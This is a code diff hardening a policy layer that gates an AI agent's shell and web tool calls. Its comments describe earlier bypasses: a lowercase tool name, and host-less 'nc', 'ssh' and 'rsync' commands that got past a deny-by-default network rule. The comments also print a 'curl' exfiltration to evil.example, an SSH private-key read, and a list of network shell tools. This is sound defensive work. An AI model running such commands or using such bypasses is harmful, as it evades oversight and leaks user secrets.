@@ -86,6 +86,18 @@ TOOL_MAP: dict[str, str] = {
     "BashOutput": "shell",
 }
 
+#: Case-insensitive index of :data:`TOOL_MAP`. A host adapter — or a Skill's
+#: ``capsule-calls`` block, which documents no tool-name casing rule — may send
+#: a non-canonical verb (``bash`` / ``webfetch`` instead of ``Bash`` /
+#: ``WebFetch``). Before v0.4 ``to_call_request`` matched case-sensitively, so
+#: a lowercase verb degraded to a bare ``shell`` call with no parsed
+#: command/URL and a ``bash: curl https://evil.example`` exfil was waved
+#: through under a profile that grants ``shell``. Looking up via this index
+#: closes that bypass and hardens future host adapters that send non-canonical
+#: casing. ``str.title()`` is NOT enough: it lower-cases the F in ``WebFetch``
+#: (and the E in ``MultiEdit``), so a lower-cased index is the correct fix.
+_TOOL_MAP_LOWER: dict[str, str] = {k.lower(): v for k, v in TOOL_MAP.items()}
+
 #: Shell verbs that read a file argument — used to recover the *path* a Bash
 #: command targets so a ``cat ~/.ssh/id_rsa`` is checked as a path read, not an
 #: opaque shell call.
@@ -96,6 +108,10 @@ _NET_CMDS = {"curl", "wget", "http", "https", "nc", "ncat", "scp", "sftp", "ssh"
 _URL_RE = re.compile(r"""\b((?:https?|ftp)://[^\s'"]+)""", re.IGNORECASE)
 _HOSTISH_RE = re.compile(r"\b([a-z0-9.-]+\.[a-z]{2,})\b", re.IGNORECASE)
 _IPV4_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")
+#: A single-label hostname (no dot) — ``localhost`` or an ssh-config alias
+#: like ``nas`` / ``buildbox``. Recognised so a profile can allow-list egress
+#: to a local single-label host (a local LLM/Ollama server, a local webhook).
+_SINGLE_LABEL_RE = re.compile(r"^[a-z0-9][a-z0-9-]*$", re.IGNORECASE)
 
 
 def _is_ipv4(token: str) -> bool:
@@ -108,17 +124,22 @@ def _is_ipv4(token: str) -> bool:
 def _extract_host(token: str) -> Optional[str]:
     """Pull a bare hostname (or IPv4/IPv6 literal) out of a URL or host token.
 
-    Recognises a DNS name (``api.github.com``), an IPv4 literal (``1.2.3.4``),
-    and a bracketed IPv6 literal (``[::1]`` / ``[fe80::1]``). Leading-wildcard
-    subdomain *patterns* (``*.internal``) are NOT hosts and are left for the
-    policy engine's :func:`~capsule.policy.match_host` to handle.
+    Recognises a DNS name (``api.github.com``), a single-label host
+    (``localhost``, an ssh-config alias like ``nas``), an IPv4 literal
+    (``1.2.3.4``), and a bracketed IPv6 literal (``[::1]`` / ``[fe80::1]``).
+    Leading-wildcard subdomain *patterns* (``*.internal``) are NOT hosts and
+    are left for the policy engine's :func:`~capsule.policy.match_host` to
+    handle.
 
     Returns the host lower-cased, or ``None`` when the token is not a host.
 
     Before v0.2 this only matched DNS names (the TLD had to be letters), so an
     IPv4 host returned ``None`` — which let ``curl http://1.2.3.4`` slip past the
     network rule under a profile that grants ``shell``. IPv4 and IPv6 are now
-    first-class hosts.
+    first-class hosts. Before v0.4 a single-label host (``localhost``) still
+    returned ``None``, so a profile that explicitly listed ``localhost`` in
+    ``network.allow`` had its explicitly-allowed local egress DENIED — the
+    allow-list was silently non-functional for single-label hosts.
     """
     token = token.strip().strip("'\"")
     if "://" in token:
@@ -136,6 +157,8 @@ def _extract_host(token: str) -> Optional[str]:
     if _is_ipv4(token):
         return token.lower()
     if _HOSTISH_RE.fullmatch(token):
+        return token.lower()
+    if _SINGLE_LABEL_RE.fullmatch(token):
         return token.lower()
     return None
 
@@ -212,8 +235,15 @@ def _parse_bash(command: str) -> CallRequest:
             file_path = _file_url_path(a)
             if file_path is not None:
                 return CallRequest(tool="shell", path=file_path, access="read", raw=raw)
-        # A network command with no resolvable host is still suspicious.
-        return CallRequest(tool="shell", raw=raw)
+        # A network command whose args yield no resolvable host/path is still
+        # network egress — fail-closed like the URL branch above: carry the
+        # first non-flag arg (or the raw command) as the host so the network
+        # rule is consulted. Before v0.4 this returned a bare host-less shell
+        # call, which `ssh localhost` / `nc localhost 4444` /
+        # `rsync data buildbox:/tmp/` exploited to bypass a deny-by-default
+        # network profile (shell granted, no host => no network rule => ALLOWED).
+        fallback_host = args[0] if args else raw
+        return CallRequest(tool="shell", host=fallback_host, raw=raw)
 
     if verb in _FILE_READ_CMDS and args:
         return CallRequest(tool="shell", path=args[0], access="read", raw=raw)
@@ -245,10 +275,10 @@ def to_call_request(
         through.
     """
     data: Mapping[str, Any] = tool_input or {}
-    verb = TOOL_MAP.get(tool_name, "shell")
+    verb = _TOOL_MAP_LOWER.get(tool_name.lower(), "shell")
 
     # Shell commands get parsed for intent (network / sensitive-path).
-    if tool_name in ("Bash", "BashOutput"):
+    if tool_name.lower() in ("bash", "bashoutput"):
         command = str(data.get("command", "")).strip()
         if command:
             return _parse_bash(command)
